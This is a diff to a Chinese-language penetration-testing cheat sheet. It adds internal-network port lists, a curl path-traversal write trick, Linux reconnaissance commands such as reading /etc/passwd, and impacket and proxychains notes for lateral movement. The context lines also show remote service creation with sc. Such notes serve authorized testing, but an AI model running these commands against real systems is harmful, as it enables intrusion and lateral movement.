@@ -213,6 +213,13 @@ cat p.txt | tr "\n" ,
 
 ## 端口列表
 
+内网端口
+```
+21,22,2222,445,135,3389,3306,1433,6379,7001,80,88,81,7000,8000,8080,8088,9090,443,8443,5000,5003,5555,7680,9000,9200,27017,2379
+```
+
+常见端口
+
 ```
 22,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,4899
 
@@ -544,7 +551,7 @@ python3 dirsearch.py -l all_site.txt -o result.txt
 ```
 
 ## 代理工具
-proxychain   
+proxychain
 sockscap64    
 proxifier   
 ccproxy
@@ -1460,6 +1467,9 @@ wget -P /tmp http://127.0.0.1:8088/aliyun
 使用内置option：-o(小写)
 ```
 curl -o dodo1.jpg http:www.linux.com/dodo1.JPG
+
+可以跳目录
+curl -o ../../www/dodo1.jpg http:www.linux.com/dodo1.JPG
 ```
 使用内置option：-O（大写)
 ```
@@ -1691,6 +1701,35 @@ Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 
 ```
 
+## linux信息收集常用命令
+
+```
+uname -a 所有版本
+cat /etc/issus 判断系统
+cat /etc/passwd 查看系统用户
+
+查看ip
+ifconfig
+ip addr
+
+路由表
+route -e
+
+判断docker
+ls -al /.dockerenv
+
+定时任务
+/etc/crontab
+
+查看网络和外连
+netstat -ano
+
+查看进程
+ps -ef
+```
+
+
+
 ## at&schtasks&sc横向
 
 使用明文密码登录到目标，需要445和139端口开启：
@@ -1716,8 +1755,32 @@ sc \\192.168.210.107 start hacker      #启动hacker服务
 
 ## impacket包横向命令
 
-下载https://github.com/maaaaz/impacket-examples-windows     
+内网横向移动工具
+
+445为smb端口   
+135为rpc端口，可以用dcom和wmi  
+
+exe版本
+https://github.com/maaaaz/impacket-examples-windows     
 https://github.com/ropnop/impacket_static_binaries/releases   
+python版本
+https://github.com/fortra/impacket
+
+必备工具
+```
+sudo yum install proxychains-ng
+sudo apt install proxychains4
+sudo apt install proxychains
+
+配置
+vim /etc/proxychains.conf
+```
+
+测试代理
+```
+curl -x http://127.0.0.1:1080 -v cip.cc
+```
+
 Atexec
 ```
 需要445端口开启
